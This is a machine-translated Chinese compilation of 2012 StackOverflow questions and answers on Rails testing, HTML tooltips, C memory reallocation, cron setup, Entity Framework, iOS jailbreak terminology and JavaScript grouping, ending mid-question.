# StackOverflow 问答 13845000-13845999

# ruby-on-rails-3 - RSpec 和 Mongoid 以及 rails-api

> ID：13845000
> 
> 赞同：4
> 
> 时间：2012-12-12T17:11:08.797
> 
> 标签：ruby-on-rails-3, rspec, mongoid, rails-api

我正在尝试将 RSpec 与 Mongoid 和 rails-api 一起使用。我使用的宝石是`rspec-rails`和`mongoid-rspec`。一切都很好，除了这个小东西：

```
# users_controller_spec.rb
describe "GET index" do
  it "assigns all users as @users" do
    user = User.create! valid_attributes
    get :index, {}, valid_session
    assigns(:users).should eq([user])
  end
end

# users_controller.rb
def index
  @users = User.all
  render json: @users
end 
```

这样做时，我只收到此错误消息：

```
Failures:

  1) UsersController GET index assigns all users as @users
     Failure/Error: assigns(:users).should eq([user])

       expected: [#<User _id: 50c8b84606027eb8aa000001, _type: nil, created_at: 2012-12-12 17:00:54 UTC, updated_at: 2012-12-12 17:00:54 UTC, name: "testuser", email: "testuser@gmail.com">]
            got: #<Mongoid::Criteria
         selector: {}
         options:  {}
         class:    User
         embedded: false>

       (compared using ==)

       Diff:
       @@ -1,2 +1,6 @@
       -[#<User _id: 50c8b84606027eb8aa000001, _type: nil, created_at: 2012-12-12 17:00:54 UTC, updated_at: 2012-12-12 17:00:54 UTC, name: "testuser", email: "testuser@gmail.com">]
       +#<Mongoid::Criteria
       +  selector: {}
       +  options:  {}
       +  class:    User
       +  embedded: false>

     # ./spec/controllers/users_controller_spec.rb:41:in `block (3 levels) in <top (required)>' 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T03:33:56.277

`@users = User.all`是延迟加载的，所以实际的对象是一个 Criteria。

您可以检查标准，也可以像这样使用数组：

```
assigns(:users).to_a.should eq([user]) 
```

# javascript - HTML 表格中单元格的工具提示（无 Javascript）

> ID：13845003
> 
> 赞同：116
> 
> 时间：2012-12-12T17:11:14.897
> 
> 标签：javascript, html-table

是否可以为没有 JavaScript 的表格单元格提供工具提示。不能用。

* * *

## 回答 #1

> 赞同：191
> 
> 时间：2012-12-13T12:56:45.773

你有没有尝试过？

```
<td title="This is Title"> 
```

它在 Firefox v 18 (Aurora)、Internet Explorer 8 和 Google Chrome v 23x 上运行良好

* * *

## 回答 #2

> 赞同：23
> 
> 时间：2017-01-17T19:25:01.210

Mudassar Bashir 使用“title”属性给出的排名最高的答案似乎是最简单的方法，但它使您无法控制评论/工具提示的显示方式。

我发现 Christophe 对自定义工具提示类的回答似乎可以更好地控制评论/工具提示的行为。由于提供的演示不包含表格，因此根据问题，这里有[一个包含表格的演示](https://jsfiddle.net/BioData41/yxr64euy/)。

请注意，跨度的父元素（在本例中为 a）的“位置”样式必须设置为“相对”，以便注释在显示时不会推动表格内容。我花了一点时间才弄明白。

```
#MyTable{
  border-style:solid;
  border-color:black;
  border-width:2px
}

#MyTable td{
  border-style:solid;
  border-color:black;
  border-width:1px;
  padding:3px;
}

.CellWithComment{
  position:relative;
}

.CellComment{
  display:none;
  position:absolute; 
  z-index:100;
  border:1px;
  background-color:white;
  border-style:solid;
  border-width:1px;
  border-color:red;
  padding:3px;
  color:red; 
  top:20px; 
  left:20px;
}

.CellWithComment:hover span.CellComment{
  display:block;
}
```

```
<table id="MyTable">
  <caption>Cell 1,2 Has a Comment</caption>
  <thead>
    <tr>
      <td>Heading 1</td>
      <td>Heading 2</td>
      <td>Heading 3</td>
    </tr>
  </thead>
  <tbody>
    <tr></tr>
      <td>Cell 1,1</td>
      <td class="CellWithComment">Cell 1,2
        <span class="CellComment">Here is a comment</span>
      </td>
      <td>Cell 1,3</td>
    <tr>
      <td>Cell 2,1</td>
      <td>Cell 2,2</td>
      <td>Cell 2,3</td>
    </tr>
  </tbody>
</table>
```

* * *

## 回答 #3

> 赞同：19
> 
> 时间：2012-12-12T17:18:23.337

是的。您可以`title`在可用性较差的单元格元素上使用该属性，或者您可以使用 CSS 工具提示（几个现有问题，可能与这个问题重复）。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2012-12-12T18:01:50.603

您可以使用 css 和 :hover 伪属性。这是一个[简单的演示](http://jsfiddle.net/Ke23E/)。它使用以下CSS：

```
a span.tooltip {display:none;}
a:hover span.tooltip {position:absolute;top:30px;left:20px;display:inline;border:2px solid green;} 
```

请注意，旧浏览器对 :hover 的支持有限。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2017-02-20T16:52:22.407

BioData41 添加的内容的演变......

将以下内容放在 CSS 样式中

```
 <style>

        .CellWithComment{position:relative;}

        .CellComment
        {
            visibility: hidden;
            width: auto;
            position:absolute; 
            z-index:100;
            text-align: Left;
            opacity: 0.4;
            transition: opacity 2s;
            border-radius: 6px;
            background-color: #555;
            padding:3px;
            top:-30px; 
            left:0px;
        }   
        .CellWithComment:hover span.CellComment {visibility: visible;opacity: 1;}
</style> 
```

然后，像这样使用它：

```
 <table>
            <tr>
                <th class="CellWithComment">Category<span class="CellComment">"Ciaooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"</span></th>
                <th class="CellWithComment">Code<span class="CellComment">"Ciaooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo"</span></th>
                <th>Opened</th>
                <th>Event</th>
                <th>Severity</th>           
                <th>Id</th>
                <th>Component Name</th>
            </tr>
            <tr>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
            </tr>
            <tr>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
                <td>Table cell</td>
            </tr>
        </table> 
```

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2019-12-03T10:27:55.743

```
if (data[j] =='B'){
    row.cells[j].title="Basic";
} 
```

在 Java 脚本中，通过比较 Data 的值有条件地添加标题。该表由 Java 脚本动态生成。

# php - 如果单击后退浏览器按钮，如何显示警报和确认

> ID：13845005
> 
> 赞同：0
> 
> 时间：2012-12-12T17:11:22.787
> 
> 标签：php, jquery, ajax, browser

我正在创建一个主要使用 php 和 jquery 的考试应用程序。目前，应用程序具有这些页面，以便用户创建考试：

*   **Create.php**（教师创建考试详细信息，例如日期、时间、持续时间、主题、问题数量、总分等）
*   **QandA.php**（老师为考试创建问题和答案）
*   **Marks.php**（教师为每个问题的每个正确答案设置分数）
*   **Penalty.php**（教师选择他们的考试是否包含扣分）
*   **Finish.php**（简单说明您的考试创建已完成）

现在应用程序工作正常，但我已经意识到了一些事情。由于此应用程序在浏览器上运行，因此用户可以随时单击浏览器后退按钮。这会造成很大的问题，因为如果我在完成考试的创建过程中完成了一半，但单击浏览器的后退按钮，那么我将丢失我的考试创建进度，或者更糟的是我能够再次完成其中一个页面。这可能意味着存储详细信息的数据库将包含半完整的考试或可能包含比所需信息更多的信息的考试。

所以这就是我正在考虑做的事情，但我不知道首先是否可能以及这样做是否是最佳做法：

*   如果用户在以上 4 个页面中的任何一个页面（finish.php 除外）上单击后退浏览器按钮，则会出现一个确认框，说明“如果您返回上一页，那么您将丢失所有当前进度并被发送到菜单页面（menu.php）

*   如果用户在确认框中单击“确定”，那么它将导航用户到 menu.php 页面，并且它还将通过 AJAX 导航到另一个 php 页面（deleteentry.php），它将从数据库中删除考试详细信息）

*   如果用户点击取消，那么他们可以在当前页面上继续没有问题

*   如果用户在finish.php页面上点击后退浏览器按钮，那么它将显示一条警报，指出“您无法返回，您的exax已成功完成，您将被导航回菜单页面”它会做的一切将用户导航到 menu.php 页面，仅此而已，无需调用 ajax 或任何东西）

那么我的问题是

1.  上述想法是否是能够解决此问题的合适解决方案

2.  应该如何编写代码来确定何时按下后退浏览器按钮，具体取决于它被按下的页面并能够执行它能够执​​行的命令？还需要知道如何编写 AJAX 以在后台导航到 deleteentry.php 页面。

非常感谢你

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:13:34.057

我将回答你标题中的问题：

> 如果单击后退浏览器按钮，如何显示警报和确认

您无法知道是否单击了“返回”按钮，或者页面是否已刷新或只是页面已更改 ->

该`onunload`事件将处理所有这些情况。

# ios - UIView - 动画视图

> ID：13845008
> 
> 赞同：0
> 
> 时间：2012-12-12T17:11:27.927
> 
> 标签：ios, uiviewanimation, uiviewanimationtransition

我想按下一个按钮让我的 UIView 打开到一侧。我的意思是就像一扇门会打开，它的侧面是固定的，但不是完全旋转，只是旋转了 30-40° 角。我怎样才能做到这一点？我尝试使用 UIViewAnimationOptionTransitionFlipFromBottom 翻转 UIView，但它完全翻转并且轴位于其中心，而不是一侧。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:43:40.883

这个 SO question 讨论了如何创建翻页动画，如 Flipboard iPad 应用程序。您当然可以以此为起点来制作只翻转一部分的动画：

[翻板动画](https://stackoverflow.com/questions/4158108/flipboard-animation)

# c - realloc 变体

> ID：13845013
> 
> 赞同：3
> 
> 时间：2012-12-12T17:11:42.973
> 
> 标签：c, realloc

只是为了定位上下文：它是关于一个字符串池，意思是一个带有字符串键的哈希表（实际上是知道它们长度的特殊字符串，但我想这个细节在这里无关紧要）。关键是当池需要增长时调整列表数组（用作表桶）的大小。但是——这是核心细节——包含字符串的单元实际上是在一个单元数组中，而不是分散在内存的各个角落 [1]。因此，我不再需要这些列表，它们只是过时的东西。所以：

1.  是否有一种 realloc 变体可以像 calloc 一样将内存区域“归零”？我在这里需要它，因为这些项目不仅是指针，而且列出了头：问题是确保一个空列表是/显示为 NULL。否则，是最好的解决方案`memset(p, size, 0);`

2.  如果没有足够的空间来就地增长，是否有一种不会复制的 realloc 变体，而是像 alloc 一样分配？这里的问题是我不再需要数据，因为字符串需要根据新的模数重新分布在列表中。否则，最好的选择是什么？

    *   使用重新分配
    *   (free &) 使用 alloc
    *   (免费 &) 使用 calloc

这在任何情况下都是正确的：realloc 尝试在原地分配更多空间，否则在其他地方分配并静默复制？如果是，那么问题可能是（至少）三个用例需要不同的操作——在有或没有足够空间的两种情况下——但是一个没有选项的函数：

*   我需要更多的地方来存放这些数据以及更多（标准）。
*   我需要更多的地方，但从现在开始数据就是垃圾。
*   我需要更多空间和要“归零”的区域。

对我来说最好的选择是什么？你还有什么看法？我在哪里可以找到有关该主题的更多反思或信息？

alloc 与 calloc 和 realloc 有不同的接口是否有原因？（我的意思是指定总尺寸与单一尺寸和计数）

[1] 原来是为了做有序集合&地图；对于字符串池，它不需要但不会打扰。相反，它使代码更清晰并提供了引用的局部性。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T17:36:45.307

> 是否有一种 realloc 变体可以像 calloc 一样将内存区域“归零”？

不。

> 如果没有足够的空间来就地增长，是否有一种不会复制的 realloc 变体，而是像 alloc 一样分配？

不。

如果我是你，我可能会使用`free`and `calloc`。但理想情况下，您希望将系统设计为不经常重新分配，因此各种选项的不同性能特征并不显着。换句话说，请确保您选择的选项无关紧要。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T19:27:06.913

> 是否有一种 realloc 变体可以像 calloc 一样将内存区域“归零”？我在这里需要它，因为这些项目不仅是指针，而且列出了头：问题是确保一个空列表是/显示为 NULL。否则，是 memset(p, size, 0); 的最佳解决方案；

如果您严格按照标准进行编码，那么您将被困在`memset`. 至少这个很容易解决。

如果您有一些特定于平台的余地，其中一些确实具有`recalloc`功能。

> 如果没有足够的空间来就地增长，是否有一种不会复制的 realloc 变体，而是像 alloc 一样分配？这里的问题是我不再需要数据，因为字符串需要根据新的模数重新分布在列表中。否则，最好的选择是什么？

再次不，不幸的是。

有一个[C1X 提案，](http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1527.pdf)它添加了这两个特性（以及其他特性），但现在你被`realloc`'s 当前行为所困扰。

# windows - 如何通过 VBS 以其他用户身份运行 HTA

> ID：13845014
> 
> 赞同：1
> 
> 时间：2012-12-12T17:11:46.640
> 
> 标签：windows, vbscript, cmd, hta

我正在尝试使用我的域帐户通过 VBS 脚本启动 HTA（并让它提示我

脚本和 hta 将位于闪存驱动器上的同一目录中，因此代码必须指向脚本的当前目录。

下面的代码当前从脚本目录启动 hta，但我无法传递用户名（例如域/用户名）以作为另一个用户启动 hta

```
Set objShell = CreateObject("Shell.Application")
Set FSO = CreateObject("Scripting.FileSystemObject")
strPath = FSO.GetParentFolderName (WScript.ScriptFullName)
If FSO.FileExists(strPath & "\main.HTA") Then
     objShell.ShellExecute "mshta", Chr(34) & strPath & "\main.HTA" & Chr(34), "", "runas", 1
Else
     MsgBox "Error - HTA was not found"
End If 
```

如何将用户名（和/或密码）保存为变量并将其传递给脚本的 runas 部分以使用不同的用户凭据启动 HTA？

编辑：

这是我正在尝试做的批处理文件：

```
runas /user:domain\username "c:\windows\system32\mshta.exe \"\main.hta\ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:13:05.407

您可以使用下面的代码获得当前用户名，我认为无法以任何方式获得密码。

```
Set network = CreateObject("WScript.Network")
currentUser = network.userName 
```

# c# - 实体框架在循环中调用存储过程返回不正确的结果

> ID：13845015
> 
> 赞同：0
> 
> 时间：2012-12-12T17:11:51.023
> 
> 标签：c#, entity-framework, sql-server-2005

我有一个存储过程，它返回类似于此的内容：

> 上一页LocationId | 上一页位置名称 | 下一个位置 ID | 下一个位置名称 | 批号 | 连接 ID

它接收两个参数，BatchId 和 ConnectionId，它们分别是 bigint 和 int。

在 C# 应用程序中使用 Entity Framework 的第一个版本调用此存储过程。

在应用程序中有一个 TransactionScope，在一个循环中，它将使用不同的参数执行这个存储过程。

我正在验证应用程序中的缺陷，在我的测试中，循环使用以下参数运行两次：

> 第一次运行：BatchId = 34，ConnectionId = 20
> 第二次运行：BatchId = 34，ConnectionId = 23

当我在 sproc 调用上设置断点并直接在数据库上执行它时，我在两次执行中都得到了正确的结果，但是当我允许应用程序执行它时，**我总是从第一次执行两次获得结果。**

我在 SQL Profiler 中验证了数据库在每次执行中都接收到正确的参数。

我尝试删除具有相同结果的事务范围。

有谁知道实体框架是否有一些奇怪的缓存东西，或者它是否存在故障或可能影响返回结果的东西？

我不知道还能去哪里看。任何见解将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T16:17:22.623

事实证明，在实体框架的第一个版本中，ObjectContext.ExecuteFunction 的合并选项默认为 AppendOnly，您无法将其设置为其他任何内容。

在这种情况下，我们只能想到两种解决方法来解决这个问题：

1.  使用 Ado .Net 调用存储过程。
2.  添加一个 Guid 作为存储过程的第一个参数，以便 Entity Framework 知道总是有一个新的调用并且不应该使用缓存的结果。

在 Entity Framework 版本 4 中，ObjectContext.ExecuteFunction 具有重载，我们可以将 MergeOption 设置为 NoTracking，这将解决此类问题。

# javascript - 使用 javascript 遍历跨度

> ID：13845020
> 
> 赞同：0
> 
> 时间：2012-12-12T17:12:09.823
> 
> 标签：javascript

仅使用 Javascript，我如何遍历每个 span id = "expiredDate"？我认为使用 for each 循环会很容易，但它似乎不存在于 javascript 中。我下面的代码仅适用于第一个元素。

```
<script type="text/javascript">
window.onload = function() {
    var definedDate = window.document.getElementById('expiredDate').innerHTML.split("-");
    var expiredDate = new Date(definedDate[0], definedDate[1] - 1, definedDate[2]);
    var graceDate = new Date(definedDate[0], definedDate[1] - 1, definedDate[2] - 30);
    var currentDate = new Date();

    if(currentDate > expiredDate) {document.getElementById('expiredDate').style.color = '#cc6666';}
    else if(currentDate < expiredDate && currentDate > graceDate) {document.getElementById('expiredDate').style.color = '#f0c674';}
    else {document.getElementById('expiredDate').style.color = '#b5bd68';}
}
</script>
<span id="expiredDate">2013-01-01</span>
<span id="expiredDate">2014-01-01</span>
<span id="expiredDate">2015-01-01</span> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T17:35:37.337

将您的 ID 切换到类并尝试以下操作

```
var spans = document.getElementsByTagName('span');
var l = spans.length;
for (var i=0;i<l;i++) {
    var spanClass = spans[i].getAttribute("class"); 
    if ( spanClass === "expiredDate" ) { 
        /*do stuff to current spans[i] here*/
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:49:27.360

两种方法还没说；对于两者，您都应该使用表格

```
<span class="expiredDate">...</span> 
```

1.[`.querySelectorAll`](https://developer.mozilla.org/en-US/docs/DOM/Document.querySelectorAll)方法：

```
var result = document.querySelectorAll('span.expiredDate'); // NodeList 
```

2.[`.getElementsByClassName`](https://developer.mozilla.org/en-US/docs/DOM/document.getElementsByClassName)结合[`Array.prototype.filter`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/filter)

```
var result = Array.prototype.filter.call(
                 document.getElementsByClassName('expiredDate'),
                 function (elm) { return elm.tagName === 'SPAN'; }
             ); // Array 
```

* * *

方法 1 更快，但是因为您已经使用方法 2 遍历它们，所以您可以稍后通过将所需的操作放入过滤器的函数中来节省循环，从而使其整体更快。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:27:21.520

取决于您所针对的浏览器版本。请参阅 caniuse 的[document.getElementsByClassName](http://caniuse.com/getelementsbyclassname)。根据您的范围，您还可以使用 document.getElementsByTagName 并进行迭代。或者使用 XPath 或 jQuery。

# linux - 如何添加 cron 作业来运行 php 脚本

> ID：13845021
> 
> 赞同：0
> 
> 时间：2012-12-12T17:12:10.653
> 
> 标签：linux, cron, crontab

我有一个我正在尝试使用 cron 作业运行的 php 脚本。我可以从 CLI 执行脚本

```
/usr/local/bin/php Import_Product_Data.php 
```

所以我试过了。。

```
0 0 * * * /usr/local/bin/php Import_Product_Data.php 
```

和

```
crontab 0 0 * * * /usr/local/bin/php Import_Product_Data.php 
```

和

```
crontab -e 0 0 * * * /usr/local/bin/php Import_Product_Data.php 
```

[Vince V. 说](https://stackoverflow.com/a/7220346/550309)打开你的 cronfile 并执行它.. 当我输入`crontab -e`时，我得到

```
*/5 * * * * /root/autosvnup.sh
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
~
"/tmp/crontab.ZBGTFu" 1L, 31C 
```

然后我被卡住了，不知道该怎么办..有人能帮我吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:23:46.227

这就是`vi`编辑器，您的默认文本编辑器（勾选`man vi`）。以下是用于编辑 crontab 的命令`vi`：

> 1.  `Ctrl-c`你的`/usr/local/bin/php Import_Product_Data.php`.
> 2.  将光标移动到第一个空行
> 3.  压`i`入`vi`控制台
> 4.  使用鼠标粘贴。
> 5.  打`ESC`。
> 6.  写`:wq`。
> 7.  打`RETURN`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T17:21:11.870

您看到的是 vim 文本编辑器。当你这样做时`crontab -e`，它会在默认编辑器中打开你的 crontab。可以通过以下方式更改默认编辑器，例如：

```
export EDITOR=nano 
```

..有些人发现 nano 更容易使用，因为 vim 的学习曲线有些陡峭。

要将您的脚本添加到 crontab，只需将其插入新行，这样您的 crontab 将如下所示：

```
*/5 * * * * /root/autosvnup.sh
0 0 * * * /usr/local/bin/php Import_Product_Data.php 
```

然后保存+退出，它应该在每个午夜运行一次（根据`0 0 * * *`）

# ios - Ios Jailbreak-这是怎么发生的？

> ID：13845023
> 
> 赞同：0
> 
> 时间：2012-12-12T17:12:18.670
> 
> 标签：ios, kernel, payload, userland

我想知道黑客是如何创建越狱的。我知道用户空间利用和内核利用是什么意思。我知道当我有用户空间利用时，我需要找到内核利用。但我真的不知道“有效载荷”、“ROP”是什么意思， “ROP Payload”，“payload”。这个与用户空间和内核的互连如何利用？有人可以为此做“计划”吗？谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-16T15:20:02.557

ROP 是一种使用它的编程形式，因为从 iOS 4.3 开始，没有其他方法可以工作。有效载荷是您在利用时使用的内容，因此您可以在 vm_map_copyin() 中找到一个可以在应用程序中使用的类似 mdowd 的内核利用，有效载荷本质上是修补和运行代码的代码。

# objective-c - 如何获取类簇中“顶级”类的名称？

> ID：13845028
> 
> 赞同：3
> 
> 时间：2012-12-12T17:12:28.293
> 
> 标签：objective-c, class, types, class-cluster

**设置：**

我有通过 JSON 输入的数据。

使用 NSJSONSerialization 我将 JSON 转换为对象。

JSON 中的数字值作为几种不同的可能类类型出现在 Objective-C 中：

( `NSNumber, NSDecimalNumber or __NSCFNumber`) - 所有这些都在`NSNumber`.

* * *

**问题：**

`NSNumber`1）当我有任何类型的值时，我需要一种方法来获取类簇“伞”类`NSNumber, NSDecimalNumber or __NSCFNumber`。

字符串也是如此。`NSString`当我有以下任何一种时，我需要一种方法来获得： `NSString, NSMutableString, __NSCFString, __NSCFConstantString`。

2) 例如，如果我可以通过代码获取 NSString 集群中所有类的列表，它也可以工作。然后我可以在运行时动态构建一个列表，并确保它是完整的。

* * *

**到目前为止我所拥有的：**

到目前为止，我还想不出一个理智的方法来做到这一点。所以我有一个允许类型的列表，但恐怕它可能不完整+它感觉不是最好的解决方案。

代码： [https ://github.com/icanzilb/JSONModel/blob/master/JSONModel/JSONModel.m#L45](https://github.com/icanzilb/JSONModel/blob/master/JSONModel/JSONModel.m#L45)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:19:21.523

你可以这样做：

```
id object = // obtain the object somehow

Class cls = Nil; // for now

// property list types, roughly equivalent to JSON's fundamental types
NSArray *classes = @[[NSString class], [NSNumber class], [NSArray class], [NSDictionary class], [NSData class], [NSDate class]];

Class c;
for (c in classes) {
    if ([object isKintOfClass:c]) {
        cls = c;
        break;
    }
} 
```

您可以通过将其他类添加到`classes`数组来扩展列表。最后，`cls`将包含作为实例的类集群`object`，或者`Nil`如果它不是任何一个的实例。

# javascript - 使用 AJAX 提交文本

> ID：13845029
> 
> 赞同：0
> 
> 时间：2012-12-12T17:12:30.730
> 
> 标签：javascript, ajax, jsp, post, submit-button

我是 AJAX/javascript 的新手，我正在开发 jsp。我正在尝试使用 JavaScript 按钮提交在文本区域中输入的文本。这是相关部分：对于第一个提交按钮，它工作正常，但是当发布时，我得到一个简单的页面而不是保留**EditText.jsp**的内容，我不知道为什么？第二个按钮是我试图用我自己的方法替换**getSomethingWithAjax**方法以输入大量字符。 **似乎 POST 对要提交的字符数没有限制**。

```
 function submitText()
   {
      var value =$("input[name=text]").val();
      jQuery.ajax({type:"POST",url:"EditText.jsp"})
   }
 </script>

 <form method="POST" class="example" action="/jsp/EditText.jsp" id=form2>
 <input type=hidden name=filepath value="<%=filename%>">
 <input type=hidden name=textarea value=true>

 <!--text area part here-->
 <!--first submit button-->
 <input type=submit name=submit value="Save Changes" onClick="if(runOnSubmit()) 

 {getSomethingWithAjax('EditText.jsp'+getAllFormElementsAndMakeIntoURI(true

 ),'','hereIsTheMainHeaderSpan',false,false);}">
 <!--the second button that I am trying to make-->
 <input type="button" name="submit" value="Save Changes" onClick="submitText()"> 
```

请让我知道您的建议。如果您想查看整个代码，请单击链接： [https](https://stackoverflow.com/questions/13828063/jsphow-to-replace-the-button-below-to-make-execute-the-request) ://stackoverflow.com/questions/13828063/jsphow-to-replace-the-button-below-to-make-execute-the-request 谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:30:05.490

首先，你试图这样做的方式是可怕的。

关键是我们不知道您的某些功能在做什么。但是，如果它更改了您尝试发布到的 servlet 方法的签名，那么您可能会得到一个空响应。

只需将一个函数绑定到表单的提交事件：

```
<script type="text/javascript">
    $('#form2').submit(function(){
        $.ajax({
            "type": "POST",
            "url": "EditText.jsp",
            "data": $('#form2').serialize(),
            "success": function(){
                //callback function
            }
        });
    }
</script>

<form method="POST" class="example" action="/jsp/EditText.jsp" id=form2>
    <input type=hidden name=filepath value="<%=filename%>"/>
    <input type=hidden name=textarea value=true />  
    <input type=submit name=submit value="Save Changes">
    <!--the second button that I am trying to make-->
    <input type="button" name="submit" value="Save Changes"> 
```

# php - 在 BeanStalk 中运行 PHP 应用程序与手动 EC2 实例

> ID：13845030
> 
> 赞同：1
> 
> 时间：2012-12-12T17:12:32.197
> 
> 标签：php, amazon-web-services, amazon, amazon-elastic-beanstalk

在 BeanStalk 中运行我的 PHP 应用程序与在现有 EC2 实例上运行它有什么好处。

除了轻松访问日志、监控、AWS Dashboard 等的明显好处之外。

必要时是否会在底层实例上进行自动缩放？如果是这种情况，这本身就是使用 BeanStalk 而不是手动完成工作的原因。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T18:51:19.607

是的。[Beanstalk](http://docs.amazonwebservices.com/elasticbeanstalk/latest/dg/Welcome.html)嵌入了许多 Web 部署的最佳实践，自动处理容量配置、负载平衡、扩展和应用程序健康监控的细节。

如果您的应用程序是一个标准的 PHP 应用程序，没有太多技巧和窍门，那么您应该会发现使用 Beanstalk 相当困难。一旦你拥有了 Beanstalk，它也会让你在[更新系统](http://docs.amazonwebservices.com/elasticbeanstalk/latest/dg/using-features.deploy-existing-version.html)时更轻松。

# php - PHP中重复的新对象？

> ID：13845031
> 
> 赞同：0
> 
> 时间：2012-12-12T17:12:35.667
> 
> 标签：php, object

如果我在 PHP 5.x 中执行此操作（通常是伪代码）：

```
class object{
    __construct($id){
       <<perform database query>>
    }
}

$array(1) = new object(1);
$array(1) = new object(1); 
```

我是否在浪费精力（内存、cpu 等）？数据库查询会运行两次吗？

避免这种情况的**最佳**方法是什么（如果这是一个问题）？使用`$array(1) instanceof object`? `isset($array(1))`? `array_key_exists(1, $array)`?

有没有一种（好的？）方法可以在类再次完成所有工作之前检查它是否已经存在？

* * *

编辑：为了清楚起见，我不需要这个对象两次。这个对象将被再次使用`$array(523) = new object(523);`我的主要问题是如何最好地避免冗余创建完全相同的对象。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:34:04.187

如果您想避免创建多个对象，您有几个选择。能想到的有...

1.  创建一次对象并确保将其传递到需要的位置。这意味着您必须检查代码中与该对象相关的依赖关系。

2.  使用对象工厂来构造对象，它可以返回对该对象的引用，而不是创建一个新的引用，如果它已经创建的话。

3.  实现单例模式。

与其他所有事情一样，需要权衡取舍，因此请检查您的情况并决定最适合您的情况。

# visual-studio - 是否可以在 windows phone 8 应用程序中创建自定义路由事件？

> ID：13845034
> 
> 赞同：4
> 
> 时间：2012-12-12T17:12:40.430
> 
> 标签：visual-studio, user-controls, windows-phone-8, routed-events

我有一个用户控件，我目前正在尝试根据本教程在其中实现自定义路由事件：http: [//msdn.microsoft.com/en-us/library/ms752288.aspx](http://msdn.microsoft.com/en-us/library/ms752288.aspx)

我收到一条错误消息，提示“当前上下文中不存在名称 'EventManager'”。
我试图通过写来添加它，`using System.Windows.EventManager`但没有这样的命名空间。
问题是是否可以在 windows phone 8 应用程序中创建自定义路由事件？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-21T13:14:19.517

您不能在 WP8 中制作任何自定义路由事件。相反，您可以使用依赖属性和 I 命令。因此，您可以根据自己的意愿安排活动。试试这个： [在其持有页面的代码中处理用户控件的事件](https://stackoverflow.com/questions/13678211/handling-event-of-user-control-in-its-holding-pages-code-behind)。

# javascript - Javascript数组：如何分组

> ID：13845038
> 
> 赞同：3
> 
> 时间：2012-12-12T17:12:56.747
> 
> 标签：javascript, arrays, grouping

我有一些数据的未排序数组，我想创建新的数组宽度排序数据：

```
 var gridData = [], i = -1;
        while (i++ < 5) {
                gridData[i] = {
                    "ProjectOwner": ["Corporation1","Corporation2","Corporation3"][i % 2],
                    "ProjectId": i,
                    "ProjectName": String.fromCharCode("A".charCodeAt(0) + i % 3) + (1 + i % 3),
                    "ProjectType": ["Conference","Programming","Research","Conference"][i % 4],
                    "ProjectLeader": "Name1Name2Name3".substr(i % 3 * 5,5) + " " + "Surname1Surname2Surname3".substr(i % 3 * 8,8),
                    "StartDate": new Date(2009 + i % 4 % 2, (i + 3) % 12, 5 + i * 4 % 24).toLocaleDateString(),
                    "EndDate": new Date(2010 + i % 4 % 2, (i + 3) % 12, 5 + i * 4 % 24).toLocaleDateString(),
                    "Summary": "bla bla"
                };
            } 
```

未排序的数据看起来像对象数组

我想把它分组

```
//First group by ProjectOwner
Object {Corporation1: Array[3], Corporation2: Array[3]}
   //Second group by ProjectName
   Corporation1: Array[x]
            A1 : Array [x]
                 Object1
                 Object2
                 ...
   Corporation2: Array[x] 
```

依此类推...我尝试过array.map和reduce，但它们似乎在IE中也不起作用，我也尝试过：

```
$.each(aggregation_content, function(i,aggr) {

    $.each(_newData, function(a, objA) {
        if(i > 0)
            o = _newData[a][aggregation_content[i - 1].cell];
        n = _newData[a][aggregation_content[i].cell];

        if(typeof o == "undefined") //For first row when new Data is empty array
        {
            if(! (n in newData))
                newData[n] = [];
            newData[n].push(objA);
        }
    })})
console.log(newData); 
```

聚合内容在哪里

```
{cell:"ProjectOwner",value:""},{cell:"ProjectName",value:""},{cell:"ProjectLeader",value:""},{cell:"ProjectType",value:""} 
```

而新数据从一开始就是一个gridData。这非常适合第一次聚合。但问题是当我聚合数组 newData 我需要使用

```
if(! (n in newData[o]))
    newData[o][n] = [];
 newData[o][n].push(objA); 
```

并且 [o] 应该是 [n] -node 的父节点。好的-第二组也可以使用该代码，但是当我想制作 5 个内部组时，我需要这样做

```
newData["firstGroup"]["secondGroup"]["thirdGroup"]...[n].push("Some content"). 
```

如何以编程方式实现这一点？如果我做

```
newData = newData[o] - no good
or
temp = newData
do something to temp
newData[o] = temp not good eather :'( 
```

我希望我写了可以理解的文字：D

____已编辑_2012_12_13______________________________________

所以输入数据是

```
[Object, Object, Object, Object, Object, Object]
  0: Object
   EndDate: "Monday, April 05, 2010"
   ProjectId: 0
   ProjectLeader: "Name1 Surname1"
   ProjectName: "A1"
   ProjectOwner: "Corporation1"
